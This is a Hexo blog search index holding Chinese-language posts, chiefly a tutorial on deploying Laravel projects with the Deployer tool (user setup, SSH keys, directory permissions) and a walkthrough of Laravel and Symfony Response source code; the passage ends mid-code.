<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>composer的理想</title>
      <link href="/2018/11/02/composer%E7%9A%84%E7%90%86%E6%83%B3/"/>
      <url>/2018/11/02/composer%E7%9A%84%E7%90%86%E6%83%B3/</url>
      
        <content type="html"><![CDATA[<p>系呢个moment，要爆了<br><a id="more"></a></p><p><img src="jb.png" alt="从来没有放弃过成为一个伟大作曲家的梦想"></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>nosql学习汇总</title>
      <link href="/2018/11/01/nosql%E5%AD%A6%E4%B9%A0%E6%B1%87%E6%80%BB/"/>
      <url>/2018/11/01/nosql%E5%AD%A6%E4%B9%A0%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<p>web开发中的大宝贝，了解一下<br><a id="more"></a></p><p>Nosql的全称是Not Only Sql，这个概念早起就有人提出，在09年的时候比较火。Nosql指的是非关系型数据库，而我们常用的都是关系型数据库。就像我们常用的mysql，sqlserver一样，这些数据库一般用来存储重要信息，应对普通的业务是没有问题的。但是，随着互联网的高速发展，传统的关系型数据库在应付超大规模，超大流量以及高并发的时候力不从心。而就在这个时候，Nosql得到的告诉的发展。因此熟练Nosql也是web开发领域中必须了解的一个重要部分,个人学习文章汇总如下</p><ul><li><a href="/2018/09/07/memcached学习笔记/">Memcached学习笔记</a></li><li><a href="/categories/Redis/">Redis学习笔记</a></li><li><a href="#">MongoDB</a></li></ul>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>deployer的使用</title>
      <link href="/2018/10/31/deployer%E7%9A%84%E4%BD%BF%E7%94%A8%E6%8A%A5%E5%91%8A/"/>
      <url>/2018/10/31/deployer%E7%9A%84%E4%BD%BF%E7%94%A8%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<p>让部署变得更加的简单</p><a id="more"></a><p>平时，如果我们开发好一个laravel项目之后，纯手工部署代码的话，需要经历以下步骤：</p><ul><li>安装好服务器环境</li><li>下载项目代码</li><li>下载 Composer 依赖</li><li>下载 Nodejs 依赖</li><li>创建 .env 文件</li><li>执行数据库迁移</li><li>构建前端代码</li></ul><p>如果后续要更新版本，代码变更的时候，实在是一个令人感觉不好的操作，我们可能需要做以下的工作</p><ul><li>ssh 登录到服务器；</li><li>使用 git 命令更新代码仓库；</li><li>如果有 composer 依赖变更，需要执行 composer install；</li><li>如果 .env 文件有变更，需要通过 scp 或者 vim 修改；</li><li>如果有数据库变更，需要执行 php artisan migrate；</li><li>如果有队列相关的代码变更，需要执行 php artisan queue:restart；</li><li>如果有 Nodejs 依赖变更，需要执行 yarn;</li><li>如果有前端代码变更，需要执行 yarn build</li></ul><p>如果我们使用纯手工的方式部署会有以下问题：</p><ul><li>容易遗漏步骤或者误操作；</li><li>在部署过程中站点可能不可用；</li><li>如果有多台服务器需要部署则会加剧上述两个问题。</li></ul><p>为了解决这个问题，我们可以使用Deployer 这个部署工具，Deployer 可以让我们用 PHP 代码的方式描述部署步骤并执行，对于php开发者来说真的是一个福音咯</p><p>我之前练手用的电商系统，就是用deployer部署的，支持单机跟多机部署，可戳<a href="https://github.com/shisiying/shop" target="_blank" rel="noopener">shop</a></p><h1 id="什么是Deployer"><a href="#什么是Deployer" class="headerlink" title="什么是Deployer"></a>什么是Deployer</h1><p>Deployer 是一个基于 SSH 协议的无侵入 web 项目部署工具，因为它不需要你在目标服务器上装什么服务之类的东西即可使用，它只需要在你的开发机，或者你的笔记本，就是发起部署动作的一方安装即可。</p><p>它的原理就是通过 SSH 到你的机器去创建目录，移动文件，执行指定的动作来完成项目的部署</p><p>跟我们shell脚本其实是一样的，只不过，我们不需要去服务器上面进行操作，而且在本地恋用熟悉的php进行编写部署脚本后，通过ssh协议，登录到指定服务器进行一系列操作，所以说还是很友好的。</p><h1 id="Deployer-的安装与配置"><a href="#Deployer-的安装与配置" class="headerlink" title="Deployer 的安装与配置"></a>Deployer 的安装与配置</h1><h2 id="Deployer的安装"><a href="#Deployer的安装" class="headerlink" title="Deployer的安装"></a>Deployer的安装</h2><p>Deployer的安装与配置都是在本地进行操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ composer global require deployer/deployer</span><br></pre></td></tr></table></figure><p>安装完成后我们试试看是否安装成功：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dep</span><br></pre></td></tr></table></figure><h2 id="Deployer的配置"><a href="#Deployer的配置" class="headerlink" title="Deployer的配置"></a>Deployer的配置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dep init</span><br></pre></td></tr></table></figure><p>接下来的操作，选择yes就行了</p><p>dep init 命令用来创建一个部署脚本，会询问我们项目类型，我们是 Laravel 项目所以输入 1 然后回车；接下来询问 Repository 也就是我们代码仓库的地址</p><p>快速入门可参考官网<a href="https://deployer.org/docs/getting-started" target="_blank" rel="noopener">Deployer</a></p><p>初始化后，会自动生成 deployer.php 文件。 deployer.php 文件包含了基本的部署配置和任务，且有明确的注释，你可以根据注释在适当的地方添加配置以及任务。</p><p>可参考我的部署脚本可戳<a href="https://github.com/shisiying/shop" target="_blank" rel="noopener">shop</a></p><h2 id="服务器权限的配置"><a href="#服务器权限的配置" class="headerlink" title="服务器权限的配置"></a>服务器权限的配置</h2><p>在本地编写部署脚本是最简单写的，最难的就是用户权限的控制问题，刚开始使用的时候经常会遇到permission denied的问题，<br>以下参考自安正超的配置：</p><p>出于安全考虑，我们一般不会使用 root 用户的 SSH 登录，而是使用其它用户，比如 Ubuntu 默认的 ubuntu 用户。<br>我们 Deployer 是用来部署 web 应用的，所以我们也专门创建一个用户来做这件事情比较好：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo adduser deployer</span><br><span class="line"><span class="comment"># 密码什么的，按提示操作即可</span></span><br></pre></td></tr></table></figure><p>我们的 web 项目通常需要一些上传，或者缓存写入这样的操作，所以 deployer 还需要有权限对目录进行修改，比如 Laravel 的 storage 目录需要可写权限，这里以 nginx 默认的用户组 www-data 举例，如果你修改过用户或者组名请对应修改下面的命令里的 www 用户组：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo usermod -aG www-data deployer</span><br></pre></td></tr></table></figure><p>我们通常需要将deployer 用户权限分别设置为创建文件 644 与目录 755，这样一来，deployer 用户可以读写，但是组与其它用户只能读：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ su deployer <span class="comment"># 切换到 deployer 用户</span></span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">"umask 022"</span> &gt;&gt; ~/.bashrc</span><br><span class="line">$ <span class="built_in">exit</span> <span class="comment"># 退出</span></span><br></pre></td></tr></table></figure><p>我们需要将 depoloyer 用户加到 sudoers 中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ vim /etc/sudoers</span><br><span class="line"><span class="comment"># 在最后加入</span></span><br><span class="line">deployer ALL=(ALL) NOPASSWD: ALL</span><br><span class="line"><span class="comment"># 保存并退出</span></span><br></pre></td></tr></table></figure><p>接下来要对我们的 web 根目录授权，假设我们的 web 服务的根目录在 /var/www/ 下，那么需要将这个目录的用户设置为 deployer ，组设置为 www 用户 www-data:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo chown deployer:www-data /var/www/html <span class="comment"># 最后这里不要加斜线哦</span></span><br><span class="line">为了让 deployer 用户在 /var/www/html 下创建的文件与目录集成根目录的权限设定（用户：deployer,组：www-data），我们还需要一步操作：</span><br><span class="line"></span><br><span class="line">$ sudo chmod g+s /var/www/html</span><br></pre></td></tr></table></figure><p>OK，Deployer 的用户操作就结束了，接着你需要检查以下配置：</p><ul><li>确认 php 的可执行文件在全局 PATH 中，或者你手动添加到 deployer 用户目录的 .bash_profile PATH 中也可，使用命令确认（登录用户 deployer 后执行）：php -v，如果报错的话，一般建议是将 php 的 bin 文件软链接到 /usr/local/bin/（推荐） 或者 /usr/bin/ 下。</li><li>同样检查你的 Deployer 任务清单所需要用到的其它命令，比如 npm,nginx,composer 都在 deployer 用户下可以使用，否则在部署的时候会出错。</li></ul><h2 id="项目-git-仓库允许服务器访问"><a href="#项目-git-仓库允许服务器访问" class="headerlink" title="项目 git 仓库允许服务器访问"></a>项目 git 仓库允许服务器访问</h2><p>因为部署脚本需要从git服务器中获取代码，因此我们的部署服务器需要有权限可以拉取代码<br>如果代码不是公开的仓库，我们通常需要添加 SSH 公钥才可以从代码库 clone 代码，所以接着来创建公钥：</p><p>先切换当前登录用户到 deployer：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$ su - deployer</span><br></pre></td></tr></table></figure></p><p>然后创建 SSH 密钥：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$ ssh-keygen -t rsa -b 4096 -C <span class="string">"deployer"</span> </span><br><span class="line"><span class="comment"># 这里的 -C 是指定备注</span></span><br><span class="line"><span class="comment"># 一路回车下去即可</span></span><br></pre></td></tr></table></figure></p><p>然后我们将生成的公钥拷贝出来：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat ~/.ssh/id_rsa.pub <span class="comment"># 显示公钥</span></span><br></pre></td></tr></table></figure></p><p>请完整的复制 cat 出来的结果，然后去你的代码库添加 SSH 公钥。</p><p>OK, 现在你的服务器就可以从代码库 clone 代码了，你可以在服务器上 git clone 一下你的代码库测试，如果不成功，请检查你的公钥是否正确完全的复制与粘贴正确，不正确的话再次重复复制粘贴即可。</p><h2 id="服务器免密码登录-deployer"><a href="#服务器免密码登录-deployer" class="headerlink" title="服务器免密码登录 deployer"></a>服务器免密码登录 deployer</h2><p>在部署shop，因为使用的是阿里云服务器，因此带上了，购买时生成的密钥文件，只要在本地登录的时候带上那个密钥文件就可以免密码登录，命令如下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$ ssh root@&#123;你的服务器公网 IP&#125; -i ~/.ssh/laravel-shop-aliyun.pem <span class="comment">#你的密钥文件路径</span></span><br></pre></td></tr></table></figure><p>如果我们没有生成该文件，我们可以手动使用以下的方法来：</p><p>在本地（或者开发机）执行部署任务时我们不想每次输入密码，所以我们需要将 deployer 用户设置 SSH 免密码登录：</p><p>在本机生成 deployer 专用密钥，然后拷贝公钥：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -b 4096 -f  ~/.ssh/deployerkey</span><br></pre></td></tr></table></figure></p><p>然后将公钥保存到目标服务器（注意，这一步还是在本机操作）：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-copy-id -i  ~/.ssh/deployerkey.pub deployer@&#123;服务器ip&#125; <span class="comment"># 请填写服务器 IP</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 应该会让你输入 deployer 在服务器上的登录密码，输入后回车即可</span></span><br></pre></td></tr></table></figure></p><p>然后你应该就可以直接以 deployer 用户免密码登录到服务器了，测试方式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ssh deployer@｛服务器ip｝ -i ~/.ssh/deployerkey</span><br><span class="line"><span class="comment"># 应该就能直接进到服务器上了，然后 exit 退出</span></span><br></pre></td></tr></table></figure><p>OK，这一步搞定了 deployer 免密码登录，接下来我们聊项目的部署。</p><p>其实，跟我们上一部差不多，只不过阿里云服务器帮我们省略了</p><h1 id="关于-Deployer-部署结构"><a href="#关于-Deployer-部署结构" class="headerlink" title="关于 Deployer 部署结构"></a>关于 Deployer 部署结构</h1><p>Deployer 部署完成后，在服务器上的结构会是这样子：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">drwxr-sr-x 5 deployer www-data 4096 Jun 14 09:53 ./</span><br><span class="line">drwxr-sr-x 6 deployer www-data 4096 Jun 11 14:25 ../</span><br><span class="line">drwxr-sr-x 2 deployer www-data 4096 Jun 14 09:53 .dep/</span><br><span class="line">lrwxrwxrwx 1 deployer www-data   10 Jun 14 09:52 current -&gt; releases/7/</span><br><span class="line">drwxr-sr-x 4 deployer www-data 4096 Jun 14 09:53 releases/</span><br><span class="line">drwxr-sr-x 3 deployer www-data 4096 Jun 10 14:16 shared/</span><br></pre></td></tr></table></figure></p><ul><li><p>current - 它是指向一个具体的版本的软链接，你的 nginx 配置中 root 应该指向它，比如 laravel 项目的话 root 就指向：/var/www/demo-app/current/public</p></li><li><p>releases - 部署的历史版本文件夹，里面可能有很多个最近部署的版本，可以根据你的配置来设置保留多少个版本，建议 5 个。保留版本可以让我们在上线出问题时使用 dep rollback 快速回滚项目到上一个版本。</p></li></ul><ul><li>shared - 共享文件夹，它的作用就是存储我们项目中版本间共享的文件，比如 Laravel 项目的 .env 文件，storage 目录，或者你项目的上传文件夹，它会以软链接的形式链接到当前版本中。</li></ul><p>因此，在nginx配置的时候，我们可以采用:,例如项目laravel-shop</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vim /etc/nginx/sites-available/laravel-shop.conf</span><br></pre></td></tr></table></figure><p>将站点根目录修改为 /var/www/laravel-shop-deployer/current/public</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>laravel学习之Response</title>
      <link href="/2018/10/20/laravel%E5%AD%A6%E4%B9%A0%E4%B9%8BResponse/"/>
      <url>/2018/10/20/laravel%E5%AD%A6%E4%B9%A0%E4%B9%8BResponse/</url>
      
        <content type="html"><![CDATA[<p>说完Request，很自然的我们会来看Response</p><a id="more"></a><h1 id="Response"><a href="#Response" class="headerlink" title="Response"></a>Response</h1><h2 id="创建Response"><a href="#创建Response" class="headerlink" title="创建Response"></a>创建Response</h2><p>让我们回到Laravel执行路由处理程序返回响应的代码块:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Routing</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Router</span> <span class="keyword">implements</span> <span class="title">RegistrarContract</span>, <span class="title">BindingRegistrar</span></span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">runRoute</span><span class="params">(Request $request, Route $route)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $request-&gt;setRouteResolver(<span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($route)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> $route;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;events-&gt;dispatch(<span class="keyword">new</span> Events\RouteMatched($route, $request));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;prepareResponse($request,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;runRouteWithinStack($route, $request)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">runRouteWithinStack</span><span class="params">(Route $route, Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $shouldSkipMiddleware = <span class="keyword">$this</span>-&gt;container-&gt;bound(<span class="string">'middleware.disable'</span>) &amp;&amp;</span><br><span class="line">                            <span class="keyword">$this</span>-&gt;container-&gt;make(<span class="string">'middleware.disable'</span>) === <span class="keyword">true</span>;</span><br><span class="line">        <span class="comment">//收集路由和控制器里应用的中间件</span></span><br><span class="line">        $middleware = $shouldSkipMiddleware ? [] : <span class="keyword">$this</span>-&gt;gatherRouteMiddleware($route);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">new</span> Pipeline(<span class="keyword">$this</span>-&gt;container))</span><br><span class="line">                    -&gt;send($request)</span><br><span class="line">                    -&gt;through($middleware)</span><br><span class="line">                    -&gt;then(<span class="function"><span class="keyword">function</span> <span class="params">($request)</span> <span class="title">use</span> <span class="params">($route)</span> </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;prepareResponse(</span><br><span class="line">                            $request, $route-&gt;run()</span><br><span class="line">                        );</span><br><span class="line">                    &#125;);</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>runRouteWithinStack</code>方法里是最终执行路由处理程序(控制器方法或者闭包处理程序)的地方，通过上面的代码我们也可以看到执行的结果会传递给<code>Router</code>的<code>prepareResponse</code>方法，当程序流返回到<code>runRoute</code>里后又执行了一次<code>prepareResponse</code>方法得到了要返回给客户端的Response对象， 下面我们就来详细看一下<code>prepareResponse</code>方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Router</span> <span class="keyword">implements</span> <span class="title">RegistrarContract</span>, <span class="title">BindingRegistrar</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 通过给定值创建Response对象</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  \Symfony\Component\HttpFoundation\Request  $request</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  mixed  $response</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> \Illuminate\Http\Response|\Illuminate\Http\JsonResponse</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">prepareResponse</span><span class="params">($request, $response)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">static</span>::toResponse($request, $response);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">toResponse</span><span class="params">($request, $response)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($response <span class="keyword">instanceof</span> Responsable) &#123;</span><br><span class="line">            $response = $response-&gt;toResponse($request);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($response <span class="keyword">instanceof</span> PsrResponseInterface) &#123;</span><br><span class="line">            $response = (<span class="keyword">new</span> HttpFoundationFactory)-&gt;createResponse($response);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (! $response <span class="keyword">instanceof</span> SymfonyResponse &amp;&amp;</span><br><span class="line">                   ($response <span class="keyword">instanceof</span> Arrayable ||</span><br><span class="line">                    $response <span class="keyword">instanceof</span> Jsonable ||</span><br><span class="line">                    $response <span class="keyword">instanceof</span> ArrayObject ||</span><br><span class="line">                    $response <span class="keyword">instanceof</span> JsonSerializable ||</span><br><span class="line">                    is_array($response))) &#123;</span><br><span class="line">            $response = <span class="keyword">new</span> JsonResponse($response);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (! $response <span class="keyword">instanceof</span> SymfonyResponse) &#123;</span><br><span class="line">            $response = <span class="keyword">new</span> Response($response);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($response-&gt;getStatusCode() === Response::HTTP_NOT_MODIFIED) &#123;</span><br><span class="line">            $response-&gt;setNotModified();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $response-&gt;prepare($request);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面的代码中我们看到有三种Response:</p><table><thead><tr><th>Class Name</th><th>Representation</th></tr></thead><tbody><tr><td>PsrResponseInterface(Psr\Http\Message\ResponseInterface的别名)</td><td>Psr规范中对服务端响应的定义</td></tr><tr><td>Illuminate\Http\JsonResponse (Symfony\Component\HttpFoundation\Response的子类)</td><td>Laravel中对服务端JSON响应的定义</td></tr><tr><td>Illuminate\Http\Response (Symfony\Component\HttpFoundation\Response的子类)</td><td>Laravel中对普通的非JSON响应的定义</td></tr></tbody></table><p>通过<code>prepareResponse</code>中的逻辑可以看到，无论路由执行结果返回的是什么值最终都会被Laravel转换为成一个Response对象，而这些对象都是Symfony\Component\HttpFoundation\Response类或者其子类的对象。从这里也就能看出来跟Request一样Laravel的Response也是依赖Symfony框架的<code>HttpFoundation</code>组件来实现的。</p><p>我们来看一下Symfony\Component\HttpFoundation\Response的构造方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">HttpFoundation</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Response</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($content = <span class="string">''</span>, $status = <span class="number">200</span>, $headers = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;headers = <span class="keyword">new</span> ResponseHeaderBag($headers);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setContent($content);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setStatusCode($status);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setProtocolVersion(<span class="string">'1.0'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//设置响应的Content</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setContent</span><span class="params">($content)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> !== $content &amp;&amp; !is_string($content) &amp;&amp; !is_numeric($content) &amp;&amp; !is_callable(<span class="keyword">array</span>($content, <span class="string">'__toString'</span>))) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> \UnexpectedValueException(sprintf(<span class="string">'The Response content must be a string or object implementing __toString(), "%s" given.'</span>, gettype($content)));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = (string) $content;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以路由处理程序的返回值在创业Response对象时会设置到对象的content属性里，该属性的值就是返回给客户端的响应的响应内容。</p><h2 id="设置Response-headers"><a href="#设置Response-headers" class="headerlink" title="设置Response headers"></a>设置Response headers</h2><p>生成Response对象后就要执行对象的<code>prepare</code>方法了，该方法定义在<code>Symfony\Component\HttpFoundation\Resposne</code>类中，其主要目的是对Response进行微调使其能够遵从HTTP/1.1协议（RFC 2616）。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">HttpFoundation</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Response</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">//在响应被发送给客户端之前对其进行修订使其能遵从HTTP/1.1协议</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">prepare</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $headers = <span class="keyword">$this</span>-&gt;headers;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isInformational() || <span class="keyword">$this</span>-&gt;isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;setContent(<span class="keyword">null</span>);</span><br><span class="line">            $headers-&gt;remove(<span class="string">'Content-Type'</span>);</span><br><span class="line">            $headers-&gt;remove(<span class="string">'Content-Length'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Content-type based on the Request</span></span><br><span class="line">            <span class="keyword">if</span> (!$headers-&gt;has(<span class="string">'Content-Type'</span>)) &#123;</span><br><span class="line">                $format = $request-&gt;getRequestFormat();</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">null</span> !== $format &amp;&amp; $mimeType = $request-&gt;getMimeType($format)) &#123;</span><br><span class="line">                    $headers-&gt;set(<span class="string">'Content-Type'</span>, $mimeType);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Fix Content-Type</span></span><br><span class="line">            $charset = <span class="keyword">$this</span>-&gt;charset ?: <span class="string">'UTF-8'</span>;</span><br><span class="line">            <span class="keyword">if</span> 